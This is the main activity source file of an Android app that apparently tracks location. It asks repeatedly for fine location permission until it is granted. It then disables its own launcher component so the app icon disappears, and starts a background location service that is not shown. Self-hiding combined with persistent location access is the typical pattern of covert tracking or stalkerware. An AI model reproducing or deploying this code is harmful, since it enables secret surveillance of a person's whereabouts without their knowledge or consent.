package com.c137.location;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.content.Intent;
import android.support.v4.app.ActivityCompat;
import com.crashlytics.android.Crashlytics;
import io.fabric.sdk.android.Fabric;

public class MainActivity extends Activity {
    private String[] permissions = new String[]{
            Manifest.permission.ACCESS_FINE_LOCATION
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Fabric.with(this, new Crashlytics());
        setContentView(R.layout.activity_main);
        requestPermissions();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (grantAllPermissions(grantResults)) {
            disableActivity();
            startLocationService();
            finish();
        } else {
            requestPermissions();
        }
    }

    private void disableActivity() {
        Context context = getApplicationContext();
        String packageName = context.getPackageName();
        ComponentName component = new ComponentName(packageName, packageName + ".MainActivity");

        context.getPackageManager().setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, permissions, 1);
    }

    private void startLocationService() {
        Context context = getApplicationContext();
        Intent serviceIntent = new Intent(context, LocationService.class);
        context.startService(serviceIntent);
    }

    private boolean grantAllPermissions(int[] grantResults) {
        if (grantResults.length != permissions.length) {
            return false;
        }

        for (int i = 0; i < permissions.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
}